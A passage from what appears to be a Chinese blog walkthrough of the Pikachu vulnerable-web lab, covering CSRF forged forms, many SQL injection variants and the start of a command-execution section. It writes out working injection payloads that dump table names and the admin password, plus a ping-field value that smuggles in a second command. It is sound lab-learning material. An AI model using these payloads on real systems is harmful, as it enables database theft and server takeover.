/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;china&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0220@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>笔者存放位置为 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost//jennie/post.html </span><br></pre></td></tr></table></figure>

<p>即受害者点击笔者存该改页面链接时收到攻击</p>
<h2 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h2><p>CSRF的主要问题是敏感操作容易被伪造</p>
<p>加入一个随机的token使之不易被伪造</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210224200741985-235595431.png"
                      alt="img"
                ></p>
<p>每次请求多了一个随机的token值，这是一个相对安全的</p>
<h2 id="附-2"><a href="#附-2" class="headerlink" title="附"></a>附</h2><p>CSRF：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/dogecheng/p/11583412.html" >CSRF<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><blockquote>
<p>CSRF 是 Cross Site Request Forgery 的 简称，中文名为跨域请求伪造</p>
<p>在CSRF的攻击场景中，攻击者会伪造一个请求（一般是一个链接）</p>
<p>然后欺骗目标用户进行点击，用户一旦点击了这个请求，这个攻击也就完成了</p>
<p>所以CSRF攻击也被称为“one click”攻击</p>
</blockquote>
<h3 id="CSRF攻击需要条件"><a href="#CSRF攻击需要条件" class="headerlink" title="CSRF攻击需要条件"></a>CSRF攻击需要条件</h3><blockquote>
<p>  ① 目标网站没有对修改个人信息修改的请求进行防CSRF处理，导致该请求容易被伪造</p>
<p>因此，判断一个网站有没有CSRF漏洞，其实就是判断对关键信息（密码等）的操作（增删改）是否容易被伪造</p>
<p>  ② lucy点击伪造的请求链接时有登录状态（已经登陆了目标网站），如果lucy没有登录，那么即便lucy点击了链接也没有作用</p>
<p>从CSRF的利用条件来看，CSRF的利用难度会大一些，所以CSRF对应的安全级别低一些</p>
</blockquote>
<h3 id="CSRF和XSS的区别"><a href="#CSRF和XSS的区别" class="headerlink" title="CSRF和XSS的区别"></a>CSRF和XSS的区别</h3><blockquote>
<p>我们利用XSS可以达到盗取用户Cookie的目的，那么CSRF的区别在哪？</p>
<ul>
<li>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。</li>
<li>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</li>
</ul>
</blockquote>
<h3 id="如何确认一个目标站点是否有CSRF漏洞"><a href="#如何确认一个目标站点是否有CSRF漏洞" class="headerlink" title="如何确认一个目标站点是否有CSRF漏洞"></a>如何确认一个目标站点是否有CSRF漏洞</h3><blockquote>
<p> 对目标站点增删改查的地方进行标记，并观察逻辑，判断请求是否可以伪造。</p>
<ul>
<li>比如修改管理员账号时，不需要验证旧密码</li>
<li>比如修改敏感信息不需要token验证</li>
</ul>
<p> 确认凭证的有效期</p>
<p>虽然退出或关闭了览器，但Cookie仍然有效，或者Session没有及时过期，导致CSRF攻击变得简单</p>
</blockquote>
<h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul>
<li><blockquote>
<p>增加Token验证（常用做法）</p>
</blockquote>
<ul>
<li>对关键操作增加Token参数，token必须随机，每次都不一样</li>
</ul>
</li>
<li><blockquote>
<p>关于安全的会话管理（避免会话被利用）</p>
</blockquote>
<ul>
<li>不要在客户端保存敏感信息（比如身份验证信息）</li>
<li>退出、关闭浏览器时的会话过期机制</li>
<li>设置会话过机制，比如15分钟无操作，则自动登录超时</li>
</ul>
</li>
<li><blockquote>
<p>访问控制安全管理</p>
</blockquote>
<ul>
<li>敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧密码</li>
<li>敏感信息的修改使用POST，而不是GET</li>
<li>通过HTTP头部中的REFERER来限制原页面</li>
</ul>
</li>
<li><blockquote>
<p>增加验证码</p>
</blockquote>
<ul>
<li>一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）</li>
</ul>
</li>
</ul>
<h1 id="SQL-inject"><a href="#SQL-inject" class="headerlink" title="SQL-inject"></a>SQL-inject</h1><blockquote>
<p>SQL注入概述</p>
<p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。<br>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p>
</blockquote>
<h2 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h2><p>抓包后，取id=2与id=3-1得到相同回显</p>
<p>即存在数字型注入</p>
<p>按部就班以从《从0到1》上学到的关于数字型注入的方法</p>
<p>事先已经先通过id=2与id=3-1得到相同回显判断这里存在数字型注入</p>
<p>且MySQL5.0版本后默认自带数据库information_schema，所有数据库名、表名、字段名都可从中查询</p>
<p>利用这一点，构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>

<p>得到回显</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302141129001-2050373802.png"
                      alt="img"
                ></p>
<p>对查询到的表进行二次查询，构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;member&#x27;</span></span><br></pre></td></tr></table></figure>

<p>即为查询member中内容</p>
<p>我就只查询member中内容便发现我们想要的id与email</p>
<p>构造查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> id,email <span class="keyword">from</span> <span class="keyword">member</span></span><br></pre></td></tr></table></figure>

<p>得到回显</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302142149894-80111615.png"
                      alt="img"
                ></p>
<p>或输入id=1 or 1=1亦可展示所有信息</p>
<h2 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h2><p>字符型需闭合前面的单引号，再注释查询内容后面的语句</p>
<p>构造时符号使用的为URL编码</p>
<p>在查询后面加入相应符号URL编码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302145427622-649417389.png"
                      alt="img"
                ></p>
<p>查询执行成功</p>
<p>在两符号中间插入上文所提到的查询语句即可</p>
<p>构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,group_concat(table_name)<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">=</span>database()<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>得到回显</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302145722111-1040084394.png"
                      alt="img"
                ></p>
<p>最后得到所有信息如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302145905787-1567657331.png"
                      alt="img"
                ></p>
<p>同样的查询语句输入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>亦可</p>
<h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>题目提示输入用户名的一部分进行查找</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302200417159-188993251.png"
                      alt="img"
                >构造闭合%‘</p>
<p>即构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;查询#</span></span><br></pre></td></tr></table></figure>

<h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>依旧是按要求构造闭合</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302200825298-485353197.png"
                      alt="img"
                ></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27;) 查询#</span></span><br></pre></td></tr></table></figure>

<h2 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h2><p>在insert/update/delete注入这几种情况中</p>
<p>不能使用 union 进行联合查询</p>
<p>因为这不是查询，而是操作</p>
<p>insert 设置用户名</p>
<p>这里一般通过or进行闭合</p>
<p>选择注册</p>
<p>在用户名栏中构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BEACON<span class="string">&#x27; or updatexml(1, concat(0x7e,database()), 0) or &#x27;</span></span><br></pre></td></tr></table></figure>

<p>利用报错进行我们的操作</p>
<p>update 修改密码</p>
<p>一样的构造，亦可</p>
<h2 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h2><p>在进行删除时，抓包修改id值为我们构造的代码即可</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>,database()), <span class="number">0</span>) </span><br></pre></td></tr></table></figure>

<h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304151627255-1247728998.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304151654953-1642833503.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304151724362-1537892774.png"
                      alt="img"
                ></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or updatexml(1, concat(0x7e, database()), 0)#</span></span><br></pre></td></tr></table></figure>

<h2 id="盲注（base-on-boolian）"><a href="#盲注（base-on-boolian）" class="headerlink" title="盲注（base on boolian）"></a>盲注（base on boolian）</h2><blockquote>
<p>基于真假的盲注主要特征</p>
</blockquote>
<ul>
<li><blockquote>
<p>没有报错信息</p>
</blockquote>
</li>
<li><blockquote>
<p>不管是正确的输入，还是错误的输入，都只有两种情况（可以看做 0 or 1）</p>
</blockquote>
</li>
<li><blockquote>
<p>在正确的输入下，后面跟 and 1=1 / and 1=2 进行判断</p>
</blockquote>
</li>
</ul>
<p>测试语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and 1=1#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#</span><br></pre></td></tr></table></figure>

<p>前者可行，后者提示用户名不存在</p>
<p>此处输出仅有用户名存在与不存在两种形式，故不能使用之前基于报错注入的形式</p>
<blockquote>
<p>我们只能通过 真 或者 假 来获取数据，所以手工盲注是很麻烦的</p>
<p>我们可以先用 length(database()) 判断 数据库名称的长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and length(database())&gt;5#</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">7</span>#</span><br></pre></td></tr></table></figure>

<p>再用 substr() 和 ascii() 判断数据库由哪些字母组成（可以用二分法）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and ascii(substr(database(), 1, 1)) &gt; 113#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> ascii(substr(database(), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">105</span>#</span><br><span class="line">……</span><br><span class="line">kobe<span class="string">&#x27; and ascii(substr(database(), 1, 1)) = 112#</span></span><br></pre></td></tr></table></figure>

<p>不断重复，然后取得数据库名。再和 information_schema 和 length 猜测 表名 的长度，我们可以用下面的 SQL 语句替代上面的 database()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>先判断表名长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and  length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,100)) = 8#</span></span><br></pre></td></tr></table></figure>

<p>然后猜解表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) &gt; 113#</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">=</span><span class="number">104</span>#</span><br></pre></td></tr></table></figure>

<p>同样的方法去猜解列名、数据，就是麻烦，用工具会方便些</p>
</blockquote>
<h2 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h2><blockquote>
<p>基于真假的盲注可以看到回显的信息，正确 or 错误</p>
<p>基于时间的注入就什么都看不到了，我们通过特定的输入，判断后台执行的时间，从而确定注入点，比如用 sleep() 函数</p>
<p>在皮卡丘平台一，无论输入什么，前端都是显示 “I don’t care who you are!”</p>
<p>我们按 F12 打开控制台，选到网络</p>
<p>然后我们输入下面的 payload 进行测试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and sleep(5)#</span></span><br></pre></td></tr></table></figure>

<p>如果存在注入点，后端就会 sleep 5秒才会返回执行结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304153126235-256397198.png"
                      alt="img"
                ></p>
<p>看到上面的结果说明我们注入成功了，构造下面的 payload，用 database() 取得数据库的名称，再用 substr 取字符判断数据库名称的组成，如果猜解成功就会 sleep 5秒，否则没有任何动作</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and  if((substr(database(), 1, 1))=&#x27;</span>p<span class="string">&#x27;, sleep(5), null)#</span></span><br></pre></td></tr></table></figure>

<p>后面也跟真假注入是一样的了，替换 database() 就可，如</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and  if((substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1))=&#x27;</span>h<span class="string">&#x27;, sleep(5), null)#</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h2 id="附-3"><a href="#附-3" class="headerlink" title="附"></a>附</h2><p>SQL注入：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/dogecheng/p/11616282.html" >SQL注入<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="发生原因"><a href="#发生原因" class="headerlink" title="发生原因"></a>发生原因</h3><blockquote>
<p>SQL注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击者可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库信息泄漏的一种漏洞。</p>
</blockquote>
<h3 id="SQL注入攻击流程"><a href="#SQL注入攻击流程" class="headerlink" title="SQL注入攻击流程"></a>SQL注入攻击流程</h3><blockquote>
<p>第一步：注入点探测</p>
<ul>
<li>自动方式：使用web漏洞扫描工具，自动进行注入点发现</li>
<li>手动方式：手工构造SQL注入测试语句进行注入点发现</li>
</ul>
<p>第二步：信息获取</p>
<p> 通过注入点取得期望得到的数据</p>
<ul>
<li>1.环境信息：数据库类型，数据库版本，操作系统版本，用户信息等</li>
<li>2.数据库信息：数据库蜜罐，数据库表，表字段，字段内容等（加密内容破解）</li>
</ul>
<p>第三步：获取权限</p>
<p> 获取操作系统权限：通过数据库执行shell，上传木马</p>
</blockquote>
<h3 id="注入点类型"><a href="#注入点类型" class="headerlink" title="注入点类型"></a>注入点类型</h3><p>按SQL语句拼接类型区分</p>
<ul>
<li>数字型：user_id=$id</li>
<li>字符型：user_id=’$id’</li>
<li>搜索型：text LIKE ‘%{$_GET[‘search’]}%’”</li>
</ul>
<h3 id="SQL中三种注释"><a href="#SQL中三种注释" class="headerlink" title="SQL中三种注释"></a>SQL中三种注释</h3><blockquote>
<p>① #</p>
<p>② – （最后面有个空格）</p>
<p>③ /**/，内联注释，这个可以在SQL语句中间使用。select * from /<em>sqli</em>/ users;</p>
</blockquote>
<h3 id="基于函数报错注入（updatexml）"><a href="#基于函数报错注入（updatexml）" class="headerlink" title="基于函数报错注入（updatexml）"></a>基于函数报错注入（updatexml）</h3><blockquote>
<p>技巧思路：</p>
<ul>
<li>在 MySQL 中使用一些指定的函数来制造报错，从报错信息中获取设定的信息</li>
<li>select / insert /update / delete 都可以使用报错来获取信息</li>
</ul>
<p>背景条件：</p>
<ul>
<li>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端</li>
</ul>
<p>三个常用函数</p>
<ul>
<li>updatexml()： MySQL 对 XML 文档数据进行查询和修改的 XPATH 函数</li>
<li>extractvalue()：MySQL 对 XML 文档数据进行查询的 XPATH 函数</li>
<li>floor()：MySQL中用来取整的函数</li>
</ul>
</blockquote>
<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/dogecheng/p/11616282.html" >具体<i class="fas fa-external-link-alt"></i></a></p>
<p> updatexml()函数作用：改变（查找并替换）XML 文档中符合条件的节点的值</p>
<p> 语法：UPDATEXML (XML_document, XPath_string, new_value)</p>
<ul>
<li><blockquote>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
</blockquote>
</li>
<li><blockquote>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。不过这里用不到。</p>
</blockquote>
</li>
<li><blockquote>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
</blockquote>
</li>
<li><blockquote>
<p>Xpath语法：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" >https://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
</li>
</ul>
<blockquote>
<p>XPath 定位必须是有效的，否则会发生错误</p>
</blockquote>
<p>在字符型注入中测试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, version(), 0)#</span></span><br></pre></td></tr></table></figure>

<p>报错</p>
<p>继续构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, version()), 0)#</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302204718989-1646774732.png"
                      alt="img"
                ></p>
<p>修改 version() 为 database() 即可得数据库名称</p>
<p>查询表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;)), 0)#</span></span><br></pre></td></tr></table></figure>

<p>报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302204948144-218161360.png"
                      alt="img"
                ></p>
<p>在 payload 后面用 limit 关键字，限制取回的结果即可</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)), 0)#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面返回了查询结果中的第一个表名，如果要查询第二个表名，我们可以把 limit 语句换成 limit 1,1</p>
<p>limit 后的第一个数据是起始位置，第二个数字是取出的数据条数</p>
</blockquote>
<p>获取字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)), 0)#</span></span><br></pre></td></tr></table></figure>

<p> 获取数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select username from users limit 0,1)), 0)#</span></span><br></pre></td></tr></table></figure>

<p>获取密码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1, concat(0x7e, (select password from users where username = &#x27;</span>admin<span class="string">&#x27; limit 0,1)), 0)#</span></span><br></pre></td></tr></table></figure>

<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p> extractvalue()函数作用：从目标 XML 中返回包含所查询值的字符串</p>
<p> 语法：ExtractValue(xml_document, XPathstring)</p>
<blockquote>
<ul>
<li>第一个参数：xml_document 是 string 格式，为 XML 文档对象的名称</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>第二个参数： XPathstring，XPath 格式的字符串</li>
</ul>
</blockquote>
<p>构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and extractvalue(1, concat(0x7e,database())) #</span></span><br></pre></td></tr></table></figure>

<h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>向下取整。如果要用 floor() 构成报错，必须满足下面的条件</p>
<ul>
<li><blockquote>
<p>运算中有 count</p>
</blockquote>
</li>
<li><blockquote>
<p>运算中有 group by</p>
</blockquote>
</li>
<li><blockquote>
<p>运算中有 rand</p>
</blockquote>
</li>
</ul>
<p>构造</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select 2 from (select count(*), concat(version(), floor(rand(0) * 2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面表达式执行的结果会以 “a” 作为别名，然后在 字符型注入 中提交，会得到下面的报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304151045982-1013450607.png"
                      alt="img"
                ></p>
<p>我们可以把 version() 的表达式替换成别的表达式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select 2 from (select count(*), concat((select password from users where username=&#x27;</span>admin<span class="string">&#x27; limit 0,1), floor(rand(0) * 2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><blockquote>
<p>RCE(remote command/code execute)概述</p>
<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。远程系统命令执行<br>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</p>
<p>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-<br>远程代码执行<br>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
</blockquote>
<h2 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2><p>ping</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure>

<p>出现如下结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304165355517-1848439215.png"
                      alt="img"
                ></p>
<p>出现乱码</p>
<p>解决方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306153852778-1669047025.png"
                      alt="img"
                ></p>
<p>我自己尝试了一下，没有解决</p>
<p>再到网上搜其他方法，也没有解决</p>
<p>或许可以通过在源代码上增加转为UTF-8的几行代码</p>
<p>这一个没有去尝试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306154845271-992102163.png"
                      alt="img"
                ></p>
<p>在命令执行漏洞中，可通过&amp;、&amp;&amp;、|、||、; 等符号拼接执行命令</p>
<p>如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig</span><br></pre></td></tr></table></figure>

<p>不仅执行ping命令，ipconfig也执行</p>
